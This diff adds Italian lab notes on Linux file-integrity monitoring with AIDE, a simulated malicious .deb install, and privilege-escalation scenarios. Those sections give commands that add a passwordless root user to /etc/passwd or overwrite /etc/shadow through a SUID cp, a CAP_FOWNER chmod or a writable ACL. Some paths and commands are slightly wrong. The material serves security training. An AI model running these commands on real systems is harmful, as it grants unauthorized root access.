@@ -1,0 +1,94 @@
+AIDE: strumento per verificare l'integrità dei dati sul filesystem
+Controllando il file di configurazione "aide.conf":
+- database_in: riferimento con il quale viene confrontato il file system.
+- database_out: snapshot creato sul filesystem, da tenere come riferimento
+- database_new: può essere usato per confrontare due database tra loro
+La sezione GROUPS predispone nomi simbolici per set di controlli pre-aggregati
+L'ultima riga "@@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$" istruisce AIDE a includere tutti i file di configurazione nella cartella menzionata 
+Da root commentiamo l'ultima riga per ridurre i tempi di test e la sostituiamo con una nostra direttiva semplice per controllare tutti i file dentro /bin e /usr/bin
+
+< /bin f Full >
+< /user/bin f Full >
+--------------------
+Inizializzare il database:
+< sudo aideinit >
+Ciò crea il file configurato "database_out" e, se non esiste il file configurato con "database_in" lo crea identico al primo.
+Nelle esecuzioni successive, non lo sovrascriverà, ma se lo si vuole aggiornare con una "fotografia" più recente del filesystem, si dovrà copiare a mano il "database_out" in "database_in" 
+< sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db >
+
+Creo un file in una directory monitorata (AIDE dovrebbe monitorarlo)
+< touch /bin/indesiderato >
+E ora lanciamo AIDE in modalità CHECK (bisogna specificare il file di configurazione)
+< aide -C -c /etc/aide/aide.conf >
+
+L'output dice: AIDE found differences between database and filesystem!! per poi mostrare le cose aggiuntive
+-------------------------
+GENERIAMO UN'INFEZIONE
+Supponiamo che attraverso un repository malconfigurato, durante un aggiornamento, si installi inconsapevolmente il pacchetto "hello-world_0.0.1-1.deb"
+< dpkg -i hello-world_0.0.1-1.deb >  (<  sudo apt install -f >) per le dipendenze
+Lanciando aide come prima < aide -C -c /etc/aide/aide.conf > notiamo che:
+vengono segnalati tutti i nuovi file introdotti dal pacchetto .deb
+------------------------
+PRIVILEGE ESCALATION - SUID
+A cp è stato assegnato il bit SUID, possiamo usarlo per copiare file normalmente inaccessibili e per installare versioni modificate di file di sistema. Ad esempio:
+< cat /etc/passwd > passwd >
+< echo "toor::0:0::/root:/bin/bash" >> passwd >
+< cp passwd /etc/passwd >
+Oppure
+< cp /etc/shadow shadow >
+< cat shadow > shadow.scrivibile >
+< echo "toor:<hash_della_password" > shadow.scrivibile >
+< cp shadow.scrivibile /etc/shadow >
+
+---------------------
+PRIVILEGE ESCALATION - CAPABILITIES
+A chmod è stata data la capability CAP_FOWNER quindi chiunque lo può usare per cambiare permessi a qualsiasi file, anche se non è proprietario
+< chmod 666 /etc/passwd > -> rende il file /etc/passwd leggibile e scrivibile da chiunque sul sistema
+< echo "toor::0:0::/root:/bin/bash" >> /etc/passwd >
+< chmod 644 /etc/passwd >
+--------------------
+PRIVILEGE ESCALATION - ACL
+Il file /etc/passwd ha ACL (Access Control Lists) attivi
+Scoprire i permessi speciali
+< getfacl /etc/passwd >
+OUTPUT:
+----
+getfacl: Removing leading '/' from absolute path names 
+# file: etc/passwd 
+# owner: root
+# group: root
+user::rw-
+user:spy:rw-                    #effective:r--   -> vuol dire che l'utente spy ha il permesso di scrivere
+group::r--         
+mask::r--
+other::r--
+----
+L'utente esiste ed è senza password
+< grep spy /etc/passwd > 
+OUTPUT: spy::5243:5243::/tmp:/bin/bash
+Chiunque può diventare spy facendo < su spy > e non verrà chiesta nessuna password (diventato spy si può modificare il file /etc/passwd, oppure modificare il suo id da 5234 a 0 per renderlo root)
+-----------------------
+PRIVILEGE ESCALATION - SUDOERS
+Il file /etc/sudoers è critico per la sicurezza di qualsiasi sistema Linux perché controlla chi può ottenere  privilegi di root usando il comando sudo.
+Definisce:
+- quali utenti o gruppi possono usare sudo
+- con quali comandi
+- con o senza richiesta di password
+- se possono eseguire tutti i comandi come root oppure solo alcuni
+----------------------
+PRIVILEGE ESCALATION - PROCESSI NASCOSTI
+Ora è evidente che per come abbiamo configturato AIDE ci sono sfuggite varie infezioni.
+Il sistema offre anche servizi utili per l'automazione dei processi, che sono opportunità per l'attaccante di nascondere le proprie attività.
+
+Mostra tutti i timer di systemd attivi sul systemd attivi sul sistema.
+< systemctl list-timers >
+
+Elenca i job "at" in coda per l'esecuzione una tantum in un momento specifico. 
+< atq >
+in particolare fa vedere
+- ID del job
+- Data/Ora di esecuzione
+- Utente che ha creato il job
+
+Mostra la tabella cron dell'utente attuale (i job ricorrenti pianificati)
+< crontab -l >
